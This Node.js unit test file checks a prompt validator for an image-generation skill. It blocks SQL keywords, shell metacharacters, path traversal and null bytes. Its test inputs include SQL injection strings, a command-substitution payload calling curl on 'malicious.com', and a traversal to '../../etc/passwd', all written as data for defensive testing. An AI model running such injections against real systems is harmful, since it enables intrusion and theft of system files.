#!/usr/bin/env node

/**
 * Unit Tests for Image Generation Skill
 * Tests core functionality without actual MCP calls
 */

const assert = require('assert');

// Mock the validation function
function validatePrompt(prompt) {
  const errors = [];

  if (prompt.length < 5 || prompt.length > 1500) {
    errors.push(`Length must be 5-1500 chars`);
  }

  try {
    Buffer.from(prompt, 'utf8');
  } catch (e) {
    errors.push('Invalid encoding');
  }

  const sqlKeywords = ['SELECT', 'DROP', 'DELETE', 'INSERT', 'UPDATE', 'CREATE', 'ALTER', 'UNION', 'ORDER BY', '--', '/*', '*/'];
  if (sqlKeywords.some(kw => prompt.toUpperCase().includes(kw))) {
    errors.push('SQL injection detected');
  }

  const dangerousChars = ['`', '|', ';', '$', '$(', '>&', '<&'];
  if (dangerousChars.some(char => prompt.includes(char))) {
    errors.push('Command injection detected');
  }

  const pathPatterns = ['../', '..\\', '../../', '~/'];
  if (pathPatterns.some(pattern => prompt.includes(pattern))) {
    errors.push('Path traversal detected');
  }

  if (prompt.includes('\x00')) {
    errors.push('Null byte detected');
  }

  return {
    valid: errors.length === 0,
    errors,
  };
}

// ============================================================================
// TESTS
// ============================================================================

console.log('🧪 Running Unit Tests for Image Generation Skill\n');

// Test 1: Valid prompts
console.log('Test 1: Valid Prompts');
assert(validatePrompt('A beautiful cat sitting on a chair').valid === true);
assert(validatePrompt('Gory zombie apocalypse scene, horror, dark').valid === true);
assert(validatePrompt('Nude figure study, anatomical, artistic').valid === true);
assert(validatePrompt('超详细的中文提示: 一只猫在月光下').valid === true);
assert(validatePrompt('Velmi detailní v češtině').valid === true);
console.log('  ✅ All valid prompts passed\n');

// Test 2: Length validation
console.log('Test 2: Length Validation');
assert(validatePrompt('abc').valid === false, 'Too short');
assert(validatePrompt('a'.repeat(1501)).valid === false, 'Too long');
assert(validatePrompt('valid prompt here').valid === true, 'Valid length');
console.log('  ✅ Length validation passed\n');

// Test 3: SQL Injection detection
console.log('Test 3: SQL Injection Detection');
assert(validatePrompt("Image'; DROP TABLE images; --").valid === false);
assert(validatePrompt("SELECT * FROM users").valid === false);
assert(validatePrompt("UNION SELECT password FROM admin").valid === false);
console.log('  ✅ SQL injection detection passed\n');

// Test 4: Command Injection detection
console.log('Test 4: Command Injection Detection');
assert(validatePrompt("$(curl https://malicious.com)").valid === false);
assert(validatePrompt("Image with `command`").valid === false);
assert(validatePrompt("Something | pipe").valid === false);
console.log('  ✅ Command injection detection passed\n');

// Test 5: Path Traversal detection
console.log('Test 5: Path Traversal Detection');
assert(validatePrompt("Image from ../../etc/passwd").valid === false);
assert(validatePrompt("File ~/secret").valid === false);
assert(validatePrompt("Path ../../../root").valid === false);
console.log('  ✅ Path traversal detection passed\n');

// Test 6: Null byte detection
console.log('Test 6: Null Byte Detection');
assert(validatePrompt("Image\x00injection").valid === false);
console.log('  ✅ Null byte detection passed\n');

// ============================================================================
// SUMMARY
// ============================================================================

console.log('✅ ALL TESTS PASSED!\n');
console.log('Summary:');
console.log('  ✓ Valid prompt acceptance');
console.log('  ✓ Length validation (5-1500)');
console.log('  ✓ SQL injection detection');
console.log('  ✓ Command injection detection');
console.log('  ✓ Path traversal detection');
console.log('  ✓ Null byte detection');
console.log('\n🎉 Image Generation Skill is ready to use!\n');
